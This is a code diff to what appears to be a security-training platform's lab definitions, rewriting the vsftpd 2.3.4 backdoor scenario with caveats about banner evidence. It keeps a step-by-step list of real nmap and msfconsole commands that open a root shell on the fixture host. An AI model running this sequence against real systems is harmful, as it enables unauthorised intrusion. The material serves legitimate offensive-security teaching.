@@ -10,9 +10,9 @@ function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<ty
  *  one-line `exploit <name> <ip>` shortcut (still used by ~19 other CVE-RCE labs, untouched here). Every
  *  module path, required option, and default option below is the real thing — the exact same commands
  *  would work against a real Kali box pointed at the real vulnerable service (most of these are the
- *  standard Metasploitable2 teaching targets). Distinct from `redteam-tools-pack.ts`'s existing
- *  `msf-samba-usermap-domain-pivot` lab, which already documents the real msfconsole sequence in prose but
- *  solves via the old shortcut — that lab is left untouched; this pack is where the mechanic is real. */
+ *  standard Metasploitable2 teaching targets). The Samba usermap domain-pivot lab also uses the same
+ *  multi-step console model; older CVE-RCE scenarios that still use the legacy one-line shortcut remain
+ *  clearly distinct from these console-workflow exercises. */
 export const metasploitLabs: LabScenario[] = [
   // 1 — vsftpd 2.3.4 backdoor
   {
@@ -21,18 +21,17 @@ export const metasploitLabs: LabScenario[] = [
     difficulty: 'Easy',
     category: 'Network',
     briefing:
-      'ftp01 (10.10.70.10) is running vsftpd 2.3.4 — the exact version whose source tarball was maliciously ' +
-      'backdoored on the distribution mirror in 2011: any username containing a smiley-face sequence ' +
-      '(":)"), sent during the FTP login, causes the backdoored binary to open a root shell listener on ' +
-      'TCP 6200. This is one of the most famous, most reliably-taught vulnerable services in offensive ' +
-      'security training (it is the standard Metasploitable2 FTP target), and the real Metasploit module ' +
-      '(`exploit/unix/ftp/vsftpd_234_backdoor`) needs nothing beyond a target IP — no credentials, no ' +
-      'crafted payload, just `set RHOSTS` and `run`.',
+      'ftp01 (10.10.70.10) is a deliberately vulnerable, isolated fixture built from the malicious vsftpd ' +
+      '2.3.4 source archive distributed in 2011. In that trojaned archive, a specially formed FTP username ' +
+      'could trigger a backdoor shell on TCP 6200. The affected artifact was a compromised source archive, ' +
+      'not every legitimate build that reports the same version. Metasploit can flag a matching banner as ' +
+      'appearing vulnerable, but a banner cannot establish package provenance. The lab exists to teach the ' +
+      'historical case and real console syntax against this known fixture, not to treat version matching as proof.',
     objectives: [
-      { text: 'nmap -sV 10.10.70.10', why: 'Confirms the exact vulnerable banner: "vsftpd 2.3.4" — this specific version string is the entire precondition for this module.' },
+      { text: 'nmap -sV -p 21 10.10.70.10', why: 'Identifies the advertised FTP service. A banner is an initial lead: patched rebuilds and spoofed responses mean it cannot prove the server uses the malicious archive.' },
       { text: 'msfconsole', why: 'Opens the real Metasploit console — every following command is the literal, real msfconsole syntax.' },
       { text: 'search vsftpd', why: 'The real way an operator finds a module without already knowing its exact path by heart.' },
-      { text: 'use exploit/unix/ftp/vsftpd_234_backdoor', why: 'Loads the real, specific module for this exact backdoor.' },
+      { text: 'use exploit/unix/ftp/vsftpd_234_backdoor', why: 'Loads the real Metasploit module for the historical backdoor behavior.' },
       { text: 'show options', why: 'Confirms RPORT already defaults to 21 (the real module\'s built-in default) — only RHOSTS is missing.' },
       { text: 'set RHOSTS 10.10.70.10', why: 'The only option this module actually requires you to supply.' },
       { text: 'run', why: 'Real msfconsole: this module needs no payload selection — a successful trigger opens a raw root shell directly.' },
